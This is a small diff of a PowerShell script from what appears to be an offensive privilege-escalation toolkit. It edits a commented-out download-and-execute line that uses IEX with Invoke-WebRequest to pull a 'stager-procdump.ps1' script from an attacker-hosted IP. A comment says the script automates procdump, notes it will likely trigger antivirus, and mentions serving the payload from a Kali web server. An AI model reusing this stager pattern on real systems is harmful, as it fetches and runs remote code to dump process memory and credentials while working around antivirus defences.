@@ -1,4 +1,4 @@
-#IEX (Invoke-WebRequest -Uri "http://172.31.253.141:8000/thescriptvault/privesc/windows/start-dump.ps1")
+#IEX (Invoke-WebRequest -Uri "http://172.31.253.141:8000/thescriptvault/privesc/windows/stager-procdump.ps1")
 #This will automate the procdump process, but will likely trigger AV so needs some work. Kali should be configured to host a python web server.
 
 Write-Output "Script started"
